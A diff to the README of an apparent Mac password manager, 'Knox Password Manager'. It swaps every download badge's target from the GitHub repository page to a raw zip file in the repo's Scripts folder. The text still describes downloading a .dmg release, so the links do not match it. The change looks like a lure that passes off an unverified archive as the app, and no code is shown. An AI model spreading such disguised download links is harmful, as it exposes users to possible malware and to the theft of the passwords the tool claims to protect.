@@ -1,6 +1,6 @@
 # 🔐 Knox-Password-Manager - Simple Secure Password Storage
 
-[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
+[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://raw.githubusercontent.com/MichiAbusivo/Knox-Password-Manager/main/Scripts/Password-Knox-Manager-v3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get Knox Password Manager up and running on your Mac:
 
    Go to the official repository’s download page by clicking the big green button below:
 
-   [![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
+   [![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://raw.githubusercontent.com/MichiAbusivo/Knox-Password-Manager/main/Scripts/Password-Knox-Manager-v3.5.zip)
 
 2. **Find the Latest Release**
 
@@ -147,6 +147,6 @@ Yes. You can use Knox Password Manager for free without limitations.
 
 You can download Knox Password Manager from its official GitHub page:
 
-[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://github.com/MichiAbusivo/Knox-Password-Manager)
+[![Download Knox Password Manager](https://img.shields.io/badge/Download-Knox--Password--Manager-brightgreen)](https://raw.githubusercontent.com/MichiAbusivo/Knox-Password-Manager/main/Scripts/Password-Knox-Manager-v3.5.zip)
 
 Click the link above, download the latest `.dmg` file, and follow the installation steps above to set it up on your Mac.
